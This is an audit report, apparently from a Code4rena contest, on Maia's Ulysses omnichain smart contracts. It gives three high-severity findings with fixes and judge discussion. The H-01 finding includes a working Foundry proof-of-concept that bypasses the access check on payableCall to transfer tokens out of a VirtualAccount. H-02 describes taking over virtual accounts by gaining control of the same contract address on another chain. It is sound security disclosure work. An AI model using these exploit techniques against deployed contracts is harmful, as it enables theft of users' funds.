[H-01] All tokens can be stolen fromVirtualAccountdue to missing access modifier
Submitted by0xTheC0der, also found byMIQUINHO,minhtrng,QiuhaoLi,btk,Noro,imare,josephdara,Limbooo,alexweb3,ast3ros,0xTiwa,tank,unsafesol,windhustler,NoTechBG,alexxander,its_basu, 0xblackskull (1,2),zzzitron,gztttt,Inspecktor,bin2chen,mert_eren,ether_sky,John_Femi,joaovwfreire,MrPotatoMagic,Jorgect,ciphermarco,Yanchuan,Vagner,nobody2018,0xRstStn,pfapostol,Kek,0xDING99YA,klau5,blutorque,hals,ladboy233, 0xfuje (1,2),Pessimistic,marqymarq10,oada,peakbolt,3docSec,stuxy,kodyvim,Viktor_Cortess,n1punp,Aamir,SovaSlava,Kow,zambody,TangYuanShen,_eperezok,ayden,ustas,rvierdiiev,Black_Box_DD,HChang26,Hama,gumgumzum,KingNFT,0x180db,SpicyMeatball,0xWaitress,T1MOH,orion,perseverancesuccess, andperitoflores
All non-native assets (ERC20 tokens, NFTs, etc.) can be stolen by anyone from aVirtualAccountusing itspayableCall(...)method, which lacks the necessary access control modifierrequiresApprovedCaller. See also, thecall(…)method which utilizes therequiresApprovedCallermodifier.
Therefore, an attacker can craft a call to e.g.ERC20.transfer(...)on behalf of the contract, like thewithdrawERC20(…)method does, while bypassing access control by executing the call viapayableCall(...).
As a consequence, all non-native assets of theVirtualAccountcan be stolen by anyone causing a loss for its owner.
Proof of Concept
Add the code below as a new test filetest/ulysses-omnichain/VirtualAccount.t.soland run it usingforge test -vv --match-contract VirtualAccountTestin order to verify the above claims:
//SPDX-License-Identifier: AGPL-3.0-onlypragmasolidity^0.8.0;import{VirtualAccount}from"@omni/VirtualAccount.sol";import{PayableCall}from"@omni/interfaces/IVirtualAccount.sol";import{ERC20}from"solmate/tokens/ERC20.sol";import"./helpers/ImportHelper.sol";contractVirtualAccountTestisTest{addresspublicalice;addresspublicbob;VirtualAccountpublicvAcc;functionsetUp()public{alice=makeAddr("Alice");bob=makeAddr("Bob");// create new VirtualAccount for user Alice and this test contract as mock local portvAcc=newVirtualAccount(alice,address(this));}functiontestWithdrawERC20_AliceSuccess()public{vm.prank(alice);vAcc.withdrawERC20(address(this),1);// caller is authorized}functiontestWithdrawERC20_BobFailure()public{vm.prank(bob);vm.expectRevert();vAcc.withdrawERC20(address(this),1);// caller is not authorized}functiontestWithdrawERC20_BobBypassSuccess()public{PayableCall[]memorycalls=newPayableCall[](1);calls[0].target=address(this);calls[0].callData=abi.encodeCall(ERC20.transfer, (bob,1));vm.prank(bob);vAcc.payableCall(calls);// caller is not authorized but it does't matter}// mock VirtualAccount call to local portfunctionisRouterApproved(VirtualAccount_userAccount,address_router)externalreturns(bool) {returnfalse;}// mock ERC20 token transferfunctiontransfer(addressto,uint256value)externalreturns(bool) {console2.log("Transferred %s from %s to %s",value,msg.sender,to);returntrue;}}
Output:
Running 3 tests for test/ulysses-omnichain/VirtualAccount.t.sol:VirtualAccountTest[PASS] testWithdrawERC20_AliceSuccess() (gas: 15428)Logs:Transferred 1 from 0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f to 0xBf0b5A4099F0bf6c8bC4252eBeC548Bae95602Ea[PASS] testWithdrawERC20_BobBypassSuccess() (gas: 18727)Logs:Transferred 1 from 0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f to 0x4dBa461cA9342F4A6Cf942aBd7eacf8AE259108C[PASS] testWithdrawERC20_BobFailure() (gas: 12040)Test result: ok. 3 passed; 0 failed; 0 skipped; finished in 1.11ms
Recommended Mitigation Steps
Add the missingrequiresApprovedCallermodifier to thepayableCall(...)method:
diff --git a/src/VirtualAccount.sol b/src/VirtualAccount.solindex f6a9134..49a679a 100644--- a/src/VirtualAccount.sol+++ b/src/VirtualAccount.sol@@ -82,7 +82,7 @@ contract VirtualAccount is IVirtualAccount, ERC1155Receiver {}/// @inheritdoc IVirtualAccount-    function payableCall(PayableCall[] calldata calls) public payable returns (bytes[] memory returnData) {+    function payableCall(PayableCall[] calldata calls) public payable requiresApprovedCaller returns (bytes[] memory returnData) {uint256 valAccumulator;uint256 length = calls.length;returnData = new bytes[](length);
Assessed type
Access Control
0xLightt (Maia) confirmed
0xBugsy (Maia) commented:
Issue addressedhere.

[H-02] if the Virtual Account’s owner is a Contract Account (multisig wallet), attackers can gain control of the Virtual Accounts by gaining control of the same owner’s address in a different chain
Submitted by0xStalin, also found byladboy233andhals
Attackers can gain control of User’s Virtual Accounts and steal all the assets in these accounts held in the Root environment.
Proof of Concept
When sending signed messages from a Branch to Root, the RootBridgeAgent contract calls theRootPort::fetchVirtualAccount()to get the Virtual Account that is assigned in the Root environment to the address who initiated the call in the SrcBranch; if that address doesn’t have an assigned Virtual Account yet, it proceeds to create one and assign it.The problem is that thefetchVirtualAccount()function solely relies on the address of the caller in the SrcBranch; however, it doesn’t take into account fromwhichBranch the call comes.
BranchBridgeAgent.sol:
functioncallOutSignedAndBridge(...)externalpayableoverridelock{...//Encode Data for cross-chain call.bytesmemorypayload=abi.encodePacked(_hasFallbackToggled?bytes1(0x85) :bytes1(0x05),//@audit-info => Encodes the address of the caller in the Branch and sends it to the RootBridgeAgent//@audit-info => This address will be used to fetch the VirtualAccount assigned to it!msg.sender,_depositNonce,_dParams.hToken,_dParams.token,_dParams.amount,_dParams.deposit,_params);}
RootBridgeAgent.sol:
functionlzReceiveNonBlocking(...)publicoverriderequiresEndpoint(_endpoint,_srcChainId,_srcAddress) {.........elseif(_payload[0] ==0x04) {// Parse deposit noncenonce=uint32(bytes4(_payload[PARAMS_START_SIGNED:PARAMS_TKN_START_SIGNED]));//Check if tx has already been executedif(executionState[_srcChainId][nonce] !=STATUS_READY) {revertAlreadyExecutedTransaction();}//@audit-info => Reads the address of the msg.sender in the BranchBridgeAgent and forwards that address to the RootPort::fetchVirtualAccount()// Get User Virtual AccountVirtualAccountuserAccount=IPort(localPortAddress).fetchVirtualAccount(address(uint160(bytes20(_payload[PARAMS_START:PARAMS_START_SIGNED]))));// Toggle Router Virtual Account use for tx executionIPort(localPortAddress).toggleVirtualAccountApproved(userAccount,localRouterAddress);......}......}
RootPort.sol:
//@audit-info => Receives from the RootBridgeAgent contract the address of the caller in the BranchBridgeAgent contract//@audit-info => Fetches the VirtualAccount assigned to the _user address regardless from what Branch the call came fromfunctionfetchVirtualAccount(address_user)externaloverridereturns(VirtualAccountaccount) {account=getUserAccount[_user];if(address(account) ==address(0))account=addVirtualAccount(_user);}
Like the example, let’s suppose that a user uses a MultiSigWallet contract to deposit tokens from Avax to Root, in the RootBridgeAgent contract. The address of the MultisigWallet will be used to create a Virtual Account, and all theglobalTokensthat were bridged will be deposited in this Virtual Account.
Now, the problem is that the address of the MultisigWallet, might not be controlled by the same user on a different chain. For example, in Polygon, an attacker could gain control of the address of the same address of the MultisigWallet that was used to deposit tokens from Avax in the Root environment. An attacker can send a signed message from Polygon, using the same address of the MultisigWallet that deposited tokens from Avax, to the Root environment, requesting to withdraw the assets that the Virtual Account is holding in the Root environment to the Polygon Branch.
When the message is processed by the Root environment, the address that will be used to obtain the Virtual Account will be the address that initiated the call in Polygon; which will be the same address of the user’s MultisigWallet contract who deposited the assets from Avax. However, the Root environment, when fetching the virtual account, makes no distinctions between the branches. Thus, it will give access to the Virtual Account of the attacker’s caller address and process the message in the Root environment.
As a result, an attacker can gain control of the Virtual Account of an account contract that was used to deposit assets from a chain into Root, by gaining control of the same address of the account contract that deposited the assets in a different chain.
As explained in detail on thisarticle written by Rekt, it is possible to gain control of the same address for contract accounts in a different chain; especially for those contract accounts that are deployed using the Gnosis Safe contracts:

Recommended Mitigation Steps
The recommendation is to add some logic that validates if the caller address in the BranchBridgeAgent is a contract account or an EOA. If it’s a contract account, send a special flag as part of the crosschain message, so that the RootBridgeAgent contract can know if the caller in the SrcBranch it’s a contract or an EOA.
If the caller is an EOA, the caller’s address can be assigned as the Virtual Account owner on all the chains, for EOAs there are no problems.But, if the caller is a Contract Account, when fetching the virtual account forward to the SrcChain, and if a Virtual Account is created, authorize the caller address on the SrcBranch as the owner for that Virtual Account. This way, only the contract account in the SrcBranch can access the Virtual Account in the Root environment.
Make sure to use thesrcChainIdto validate if the caller is an owner of the Virtual Account.
Assessed type
Access Control
0xLightt (Maia) confirmed:
Contracts should not use Virtual Accounts and deploying a specific router for contract usage is most likely the safest option.
alcueca (judge) increased severity to High and commented:
This is related to#351in the wrong assumption that a given address is controlled by the same individual in all chains. There are different attack vectors and impacts, but fixing that core assumption will solve all of them.
alcueca (judge) commented:
The underlying issue is assuming that the same addresses are controlled by the same people in different chains, which is not necessarily true. While the sponsor states that contracts should not use virtual accounts, that is not specified in the documentation, and might only have been discovered in a future issue of rekt.
Limbooo (warden) commented:
@alcueca - While I appreciate the in-depth analysis presented in the report, there’s a fundamental discrepancy when it comes to the exploitability of the vulnerability mentioned.The report suggests that on Polygon, an attacker could simply gain control of an address identical to the MultiSigWallet from Avax. However, referring to a recent real-world scenario as detailed in the Wintermute incident, we observe that this assumption may be oversimplified.The Wintermute incident underscores the intricacies and challenges involved in gaining control of a similar address on a different chain:The address would have to be unclaimed or unused on the target chain.Assuming the MultiSigWallet is used across multiple chains, the rightful owners might have already claimed the address.Even if the address is unclaimed, there are intricate steps involving replicating nonce values and other parameters to “hijack” the address, and this is far from being straightforward.Given these complexities and the potential for failure, it’s crucial to approach the reported vulnerability with a nuanced understanding of its practical exploitability.
ladboy233 (warden) commented:
Agree with the above comments, that there may be some efforts involved to gain control the same address. The wrong assumption that the same address is controlled by same person when using smart contract wallet does cost Wintermute to lose 20M OP token.Once funds are lost, the loss amount is large.In the case of wintermute, the multisig wallet is created using the opcode “CREATE” instead of “CREATE2”. The create opcode is not really deprecated, and still be used.More info about the CREATE opcodehereanddeterministic addresses.Agree with high severity because the potential loss of funds is large.
alcueca (judge) commented:
There is a significant chance of actual losses because of this vulnerability, that don’t need to be enabled by any unlikely prior. The severity is High.
0xBugsy (Maia) commented:
Addressedhere.

[H-03] Redeeming a Settlement won’t work for unsigned messages when the communicating dApps have different addresses on the different chains
Submitted byalexxander, also found by3docSec
Lines of code
https://github.com/code-423n4/2023-09-maia/blob/f5ba4de628836b2a29f9b5fff59499690008c463/src/MulticallRootRouter.sol#L163-L171https://github.com/code-423n4/2023-09-maia/blob/f5ba4de628836b2a29f9b5fff59499690008c463/src/MulticallRootRouter.sol#L186-L194https://github.com/code-423n4/2023-09-maia/blob/f5ba4de628836b2a29f9b5fff59499690008c463/src/RootBridgeAgent.sol#L311-L315
Impact
Funds cannot be redeemed and remain stuck in a settlement.
Proof Of Concept
InMulticallRootRouter,execute()calls_approveAndCallOut(...); however, it passes the Output Params recipient also as the refundee. This is dangerous because the recipient Dapp on the BranchChain can have a different address or not exist on the Root Chain. Therefore, if a settlement fails, it won’t be able to be redeemed since the settlement owner is set as the refundee.
Here is a scenario:
dApp A  on a Branch Chain with (address = 0xbeef) initiates aCallOut(...) 0x01withOutputParams (0x01)for theRootRouter.RootBridgeAgentexecutor callsMulticallRootRouterexecute()which then performs some number of arbitrary calls and gets theOutputParamsassets into theMulticallRootRouter.MulticallRootRouterattempts to bridge out the assets to the BranchChain and creates a settlement, passing therecipient (address = 0xbeef)but also sets therefundee as (address = 0xbeef).If the settlement fails, there is no guarantee that0xbeefis a known dApp on the Root Chain and the assets won’t be able to be redeemed.
functionexecute(bytescalldataencodedData,uint16)externalpayableoverridelockrequiresExecutor{// Parse funcIdbytes1funcId=encodedData[0];// code .../// FUNC ID: 2 (multicallSingleOutput)}elseif(funcId==0x02) {// Decode Params(IMulticall.Call[]memorycallData,OutputParamsmemoryoutputParams,uint16dstChainId,GasParamsmemorygasParams) =abi.decode(_decode(encodedData[1:]), (IMulticall.Call[],OutputParams,uint16,GasParams));// Perform Calls_multicall(callData);// Bridge Out assets_approveAndCallOut(outputParams.recipient,outputParams.recipient,outputParams.outputToken,outputParams.amountOut,outputParams.depositOut,dstChainId,gasParams);}// code ...}
function_createSettlement(uint32_settlementNonce,addresspayable_refundee,address_recipient,uint16_dstChainId,bytesmemory_params,address_globalAddress,uint256_amount,uint256_deposit,bool_hasFallbackToggled)internalreturns(bytesmemory_payload) {// code ...// Update Settlementsettlement.owner=_refundee;settlement.recipient=_recipient;// code ...}
functionredeemSettlement(uint32_settlementNonce)externaloverridelock{// Get settlement storage referenceSettlementstoragesettlement=getSettlement[_settlementNonce];// Get deposit owner.addresssettlementOwner=settlement.owner;// Check if Settlement is redeemable.if(settlement.status==STATUS_SUCCESS)revertSettlementRedeemUnavailable();if(settlementOwner==address(0))revertSettlementRedeemUnavailable();// Check if Settlement Owner is msg.sender or msg.sender is the virtual account of the settlement owner.if(msg.sender!=settlementOwner) {if(msg.sender!=address(IPort(localPortAddress).getUserAccount(settlementOwner))) {revertNotSettlementOwner();}}/// more code ...}
Recommended Mitigation Steps
Include an argument that enables users to specify the refundee when creating settlements without using a Virtual Account.
Assessed type
Context
0xLightt (Maia) confirmed
0xBugsy (Maia) commented:
Addressedhere.
Note: for full discussion, seehere.

